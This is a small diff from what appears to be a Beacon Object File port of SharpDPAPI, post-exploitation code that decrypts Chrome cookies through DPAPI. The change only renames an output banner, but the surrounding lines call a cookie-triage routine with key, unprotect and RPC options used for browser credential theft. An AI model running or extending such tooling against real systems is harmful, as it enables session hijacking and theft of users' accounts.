@@ -88,7 +88,7 @@ void go(char* args, int args_len) {
             NULL, (BOOL)use_rpc, NULL, server, FALSE, NULL);
     }
 
-    BeaconPrintf(CALLBACK_OUTPUT, "\n=== SharpDPAPI Chrome Cookies (BOF) ===\n");
+    BeaconPrintf(CALLBACK_OUTPUT, "\n=== DPAPI Chrome Cookies (BOF) ===\n");
 
     triage_chrome_cookies(&cache, target, server, (BOOL)unprotect,
                           state_key, sk_len,
